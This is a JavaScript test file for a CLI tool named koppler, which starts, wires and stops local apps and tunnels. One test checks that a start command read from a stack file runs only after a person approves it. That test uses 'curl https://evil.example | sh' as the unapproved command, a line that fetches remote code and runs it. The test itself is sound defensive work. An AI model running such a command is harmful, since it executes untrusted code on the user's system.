import assert from 'node:assert/strict';
// Whatever a test started is stopped when the file ends, even after a failed assertion, so no port stays held.
const cleanups = [];
process.on('exit', () => cleanups.forEach(stopAll => stopAll()));
import { allowStack } from './allow.mjs';
import { freePorts, until } from './helpers.mjs';

// Ports the system says are free; the tunnel one has room after it, for the tunnel that moves.
const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] = await freePorts(11), [tunnel] = await freePorts(1, { roomAfter: 2 });

// A process that hands over to another program (as the secrets wrapper does) is still the same run: status and stop must see it.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-alive-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  assert.match(koppler('run', 'handover', '--', 'sh', '-c', 'sleep 0.4; exec sleep 30'), /started handover/);
  // With a port, "started" means it answers: a crash during startup is reported with its log, not as started.
  assert.match(koppler('run', 'crashy', '--port', String(crashy), '--', 'sh', '-c', 'sleep 2; echo boom; exit 1'), new RegExp(`crashy exited before answering on port ${crashy}[\\s\\S]*boom`));
  await until('handover showing as running', () => /handover\s+running/.test(koppler('status')));
  assert.match(koppler('stop', 'handover'), /handover: stopped/);
  assert.doesNotMatch(koppler('status'), /handover\s+running/);
  // A worker that ignores the polite signal does not outlive its app.
  assert.match(koppler('run', 'stubborn', '--', 'sh', '-c', '(trap "" TERM; exec sleep 31339) & wait'), /started stubborn/);
  assert.match(koppler('stop', 'stubborn'), /stubborn: stopped \(killed after 8s\)/);
  assert.equal(spawnSync('pgrep', ['-f', 'sleep 31339']).status, 1);
  fs.rmSync(dir, { recursive: true });
  console.log('handover ok');
}
// koppler up: the apps a run needs, the called one first, each waited for; what already runs is kept.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-up-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  const app = port => ({ name: `App ${port}`, kind: 'other', start: `python3 -m http.server ${port} --bind 127.0.0.1`, url: `http://localhost:${port}` });
  { const stack = { envs: ['qa'], apps: { a: { ...app(upA), consumes: { b: { how: 'env', env: 'B_URL' } } }, b: app(upB) } }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  const out = koppler('up', 'a', 'b', '--cable', 'a:b');
  assert.ok(out.indexOf('started b') >= 0 && out.indexOf('started b') < out.indexOf('started a'), out);
  assert.match(out, /Up on QA\./);
  assert.match(koppler('up', 'a', 'b'), /a: already running[\s\S]*b: already running|b: already running[\s\S]*a: already running/);
  koppler('stop', '--all', '--yes');
}
// koppler up: two tunnels that want the same port. The one that moves takes its app with it, so the app never dials the other one's database.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-uptunnel-')), bin = path.join(dir, 'bin');
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir, PATH: `${bin}:${process.env.PATH}` };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  // A stand-in for the tunnel program: it listens where it is told to.
  fs.mkdirSync(bin);
  fs.writeFileSync(path.join(bin, 'cloudflared'), '#!/bin/sh\nfor last; do :; done\nexec python3 -m http.server "${last##*:}" --bind 127.0.0.1\n', { mode: 0o755 });
  const app = (port, tunnel) => ({ name: `App ${port}`, kind: 'other', start: `echo "DB_ADDR=\${DB_ADDR:-unset}"; exec python3 -m http.server ${port} --bind 127.0.0.1`, url: `http://localhost:${port}`, prereqs: [tunnel] });
  const stack = { envs: ['qa'], apps: { a: app(tunA, { tunnel: 'db-a.internal', port: tunnel }), b: app(tunB, { tunnel: 'db-b.internal', port: tunnel, env: 'DB_ADDR' }) } };
  fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack);
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  const r = koppler('up', 'a', 'b');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, new RegExp(`started tunnel-db-a-${tunnel}\\b`));
  assert.match(r.out, new RegExp(`started tunnel-db-b-${tunnel + 2}\\b`));
  const log = id => fs.readFileSync(path.join(dir, 'logs', `${id}.log`), 'utf8');
  assert.match(log('b'), new RegExp(`DB_ADDR=localhost:${tunnel + 2}\\b`));
  assert.match(log('a'), /DB_ADDR=unset/);
  koppler('stop', '--all', '--yes');
  console.log('moved tunnel ok');
}
// koppler up --run: a confirmed Send carried out by Koppler itself; a cable's address reaches its caller at start, and the run is done.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-uprun-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: `echo "B_URL=$B_URL"; exec python3 -m http.server ${runA} --bind 127.0.0.1`, url: `http://localhost:${runA}`, consumes: { b: { how: 'env', env: 'B_URL' } } },
    b: { name: 'B', kind: 'other', start: `exec python3 -m http.server ${runB} --bind 127.0.0.1`, url: `http://localhost:${runB}` },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  fs.writeFileSync(path.join(dir, 'history.jsonl'), JSON.stringify({ id: 'run000010', at: 't', kind: 'run', env: 'qa', nodes: { a: { run: 'cli' }, b: { run: 'cli' } }, edges: [{ from: 'a', to: 'b' }], plan: { starts: [{ id: 'a' }, { id: 'b' }], restarts: [], stops: [], keeps: [] } }) + '\n');
  const r = koppler('up', '--run', 'run000010');
  assert.equal(r.code, 0, r.out);
  assert.ok(r.out.indexOf('started b') < r.out.indexOf('started a'), r.out);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'a.log'), 'utf8'), new RegExp(`B_URL=http://localhost:${runB}\\b`));
  assert.match(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['a', 'b']);
  koppler('stop', '--all', '--yes');
}
// From the terminal or chat: every up is recorded as a run, added to what already runs, with its cables wired.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upchat-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: `echo "B_URL=$B_URL"; exec python3 -m http.server ${agentA} --bind 127.0.0.1`, url: `http://localhost:${agentA}`, consumes: { b: { how: 'env', env: 'B_URL' } } },
    b: { name: 'B', kind: 'other', start: `exec python3 -m http.server ${agentB} --bind 127.0.0.1`, url: `http://localhost:${agentB}` },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  assert.equal(koppler('up', 'b', '--env', 'qa').code, 0);
  const r = koppler('up', 'a', '--cable', 'a:b');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /b: already running/);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'a.log'), 'utf8'), new RegExp(`B_URL=http://localhost:${agentB}\\b`));
  const live = JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8'));
  assert.deepEqual([Object.keys(live.nodes).sort(), live.edges], [['a', 'b'], [{ from: 'a', to: 'b' }]]);
  assert.equal((fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8').match(/"event":"done"/g) ?? []).length, 2);
  assert.match(koppler('up', 'a', '--cable', 'a:nope').out, /usage: --cable/);
  koppler('stop', '--all', '--yes');
}
// A start command from the stack runs only once the user allowed it, and needs allowing again when it changes.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-approve-')), marker = path.join(dir, 'ran');
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env, input: '' }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const stackWith = start => ({ envs: ['qa'], apps: { api: { name: 'API', kind: 'other', start } } });
  const write = stack => fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack));
  const first = stackWith(`touch ${marker}; exec sleep 30`);
  write(first);
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { api: { path: dir } } }));
  for (const args of [['run', 'api'], ['up', 'api']]) {
    const r = koppler(...args);
    assert.equal(r.code, 1, r.out);
    assert.match(r.out, /command from the stack[\s\S]*koppler doctor --approve/);
  }
  assert.equal(fs.existsSync(marker), false, 'nothing ran before approval');
  // Only a person at a terminal can approve: not a script, not with --yes.
  const tried = koppler('doctor', '--approve', '--yes');
  assert.match(tried.out, /touch [\s\S]*not approved/);
  assert.equal(koppler('run', 'api').code, 1);
  allowStack(dir, first);
  assert.equal(koppler('run', 'api').code, 0);
  assert.equal(fs.existsSync(marker), true);
  koppler('stop', 'api');
  write(stackWith('curl https://evil.example | sh'));
  assert.match(koppler('run', 'api').out, /not allowed yet, or that changed since/);
  koppler('stop', '--all', '--yes');
}
// Something left for the agent: the apps still start, the board shows them running (live state), and the run stays open (exit 3).
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upleft-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: `exec python3 -m http.server ${leftA} --bind 127.0.0.1`, url: `http://localhost:${leftA}`, consumes: { b: { how: 'unknown' } } },
    b: { name: 'B', kind: 'other', start: `exec python3 -m http.server ${leftB} --bind 127.0.0.1`, url: `http://localhost:${leftB}` },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  fs.writeFileSync(path.join(dir, 'history.jsonl'), JSON.stringify({ id: 'run000011', at: 't', kind: 'run', env: 'qa', nodes: { a: { run: 'cli' }, b: { run: 'cli' } }, edges: [{ from: 'a', to: 'b' }], plan: { starts: [], restarts: [], stops: [], keeps: [] } }) + '\n');
  const r = koppler('up', '--run', 'run000011');
  assert.equal(r.code, 3, r.out);
  assert.match(r.out, new RegExp(`Left for the agent:[\\s\\S]*A -> local B: point it at http://localhost:${leftB}\\b`));
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['a', 'b']);
  assert.doesNotMatch(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
  koppler('stop', '--all', '--yes');
}
// stop --apps: everything Koppler runs except the canvas.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-stopapps-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  koppler('run', 'canvas', '--', 'sleep', '30'); koppler('run', 'api', '--', 'sleep', '30'); koppler('run', 'tunnel-db-5432', '--', 'sleep', '30');
  const out = koppler('stop', '--apps', '--yes');
  assert.match(out, /api: stopped/); assert.match(out, /tunnel-db-5432: stopped/); assert.doesNotMatch(out, /canvas/);
  assert.match(koppler('status'), /canvas\s+running/);
  koppler('stop', '--all', '--yes');
}
